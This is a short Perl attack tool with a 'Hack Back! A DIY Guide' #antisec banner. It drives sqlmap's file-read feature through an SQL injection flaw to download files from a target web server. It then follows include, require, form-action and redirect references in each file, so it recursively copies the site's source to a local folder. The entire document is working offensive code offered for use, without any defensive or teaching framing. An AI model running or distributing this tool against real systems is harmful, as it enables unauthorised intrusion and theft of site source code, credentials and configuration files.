#!/usr/bin/perl -w
##
##
##                _   _            _      ____             _    _ 
##               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| | 
##               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
##               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
##               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
##                                                 
##                                  A DIY Guide
##
##
##
##                                 ,-._,-._             
##                              _,-\  o O_/;            
##                             / ,  `     `|            
##                             | \-.,___,  /   `        
##                              \ `-.__/  /    ,.\      
##                             / `-.__.-\`   ./   \'
##                            / /|    ___\ ,/      `\
##                           ( ( |.-"`   '/\         \  `
##                            \ \/      ,,  |          \ _
##                             \|     o/o   /           \.
##                              \        , /             /
##                              ( __`;-;'__`)            \\
##                              `//'`   `||`              `\
##                             _//       ||           __   _   _ _____   __
##                     .-"-._,(__)     .(__).-""-.      | | | | |_   _| |
##                    /          \    /           \     | | |_| | | |   |
##                    \          /    \           /     | |  _  | | |   |
##                     `'-------`      `--------'`    __| |_| |_| |_|   |__
##                               #antisec
##
##
##
##
##
##




use File::Basename;
use File::Path   qw/mkpath/;
undef $/;

$sqlmap_args=shift @ARGV;

$webroot=shift @ARGV;

push @files,shift @ARGV;

while (@files) {
	
	$fpath=download_file(pop @files);

	if($fpath)  {

		open FILE , "$fpath";

		$fcontents = <FILE>;
		
		close FILE;

		@new_files = $fcontents =~ /

		require[\s_(].*?['"](.*?)['"]
		|include.*?['"](.*?)['"]
		|load\("(.*?)["?]
		|form.*?action="(.*?)["?]
		|header\("Location:\s(.*?)["?]
		|url:\s"(.*?)["?]
		|window\.open\("(.*?)["?]
		|window\.location="(.*?)["?]
	       /xg;


		for $file (@new_files) {

			next unless $file;
			if($file =~/^\//) {

				$file="output/$webroot/$file";


			}#if

			else {

				$file = dirname($fpath)."/".$file;

			}#else

		

			next if -e $file;
			$file=~ s/^output//;

			print "[+] adding $file to queue ...\n";

			push @files , $file;



	}

}#end while
}

sub download_file {

	$fname=shift;
	`sqlmap $sqlmap_args --file-read='$fname' --batch`=~ /files saved to .*?(\/.*?)\(same/s;
	return unless $1;

	mkpath ("output".dirname $fname);

	rename($1,"output$fname");

	print "[+] downloaded $fname \n";

	return "output$fname";

}
